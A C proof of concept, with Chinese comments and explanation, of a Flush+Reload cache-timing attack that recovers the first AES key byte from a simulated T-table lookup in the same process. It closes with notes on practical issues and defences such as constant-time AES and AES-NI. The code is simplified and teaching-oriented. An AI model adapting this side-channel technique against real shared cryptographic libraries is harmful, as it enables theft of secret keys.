#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 100
#define TABLE_SIZE 256

// 模拟AES T-table（简化，仅使用T0）
uint32_t T0[TABLE_SIZE];  // 实际T-table值，这里仅用于地址

// 受害者AES加密函数（模拟）
void aes_encrypt(uint8_t *plaintext, uint8_t *key, uint8_t *ciphertext) {
    // 第一轮：AddRoundKey + SubBytes + ShiftRows + MixColumns
    // 这里仅模拟T-table访问：T0[plaintext[0] ^ key[0]]
    uint8_t index = plaintext[0] ^ key[0];
    volatile uint32_t tmp = T0[index];  // 访问T-table
    (void)tmp;
    // 实际加密会继续，但POC只关注第一字节
}

// 刷新整个T0表
void flush_T0() {
    for (int i = 0; i < TABLE_SIZE; i++) {
        _mm_clflush(&T0[i]);
    }
    _mm_mfence();
}

// 测量访问T0[i]的时间
uint64_t probe_T0(int i) {
    uint64_t start, end;
    unsigned int aux;
    start = __rdtscp(&aux);
    volatile uint32_t tmp = T0[i];
    end = __rdtscp(&aux);
    return end - start;
}

int main() {
    // 初始化T0（实际值不重要）
    for (int i = 0; i < TABLE_SIZE; i++) T0[i] = i;

    uint8_t plaintext[16] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
                             0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
    uint8_t key[16] = {0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
                       0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c};  // 示例密钥
    uint8_t ciphertext[16];

    // 攻击者已知明文，尝试恢复key[0]
    printf("Attempting to recover key[0]...\n");

    // 多次测量取平均
    int hits[TABLE_SIZE] = {0};
    for (int trial = 0; trial < 100; trial++) {
        // 刷新T0
        flush_T0();

        // 触发受害者加密
        aes_encrypt(plaintext, key, ciphertext);

        // 探测每个表项
        for (int i = 0; i < TABLE_SIZE; i++) {
            uint64_t t = probe_T0(i);
            if (t < CACHE_HIT_THRESHOLD) {
                hits[i]++;
            }
        }
    }

    // 找到命中次数最多的索引
    int max_hits = 0, best_index = -1;
    for (int i = 0; i < TABLE_SIZE; i++) {
        if (hits[i] > max_hits) {
            max_hits = hits[i];
            best_index = i;
        }
    }

    if (best_index != -1) {
        uint8_t recovered_key_byte = plaintext[0] ^ best_index;
        printf("Recovered key[0] = 0x%02x (actual = 0x%02x)\n", recovered_key_byte, key[0]);
    } else {
        printf("No clear hit detected\n");
    }

    return 0;
}


**实际攻击注意事项**：
- 需要精确的缓存行对齐：T-table通常按64字节对齐，每个表项4字节，但一个缓存行包含16个表项。因此Flush+Reload需要以缓存行粒度操作。
- 噪声消除：多次测量并统计，使用阈值过滤。
- 多轮攻击：AES有10/12/14轮，每轮访问不同表，但第一轮最直接。
- 防御：使用恒定时间实现（如比特切片AES）或使用硬件AES指令（如AES-NI），后者不依赖T-table。

Flush+Reload是一种基于缓存的侧信道攻击，利用共享内存（如库函数）和缓存一致性协议。攻击者与受害者共享同一物理页（例如通过动态链接库），攻击者首先使用clflush指令将目标缓存行从所有缓存级别中刷新，然后等待受害者执行，最后重新加载该缓存行并测量加载时间。如果受害者访问了该内存，则缓存行被加载，重新加载时间短；否则时间长。通过监控受害者对特定内存地址的访问模式，可以推断秘密信息（如AES密钥）。

针对AES T-table实现：AES加密使用四个查找表（T0-T3），每个表256个4字节条目。密钥相关操作会访问这些表，访问索引与密钥字节相关。攻击者可以监控特定表条目的缓存状态，从而恢复密钥。

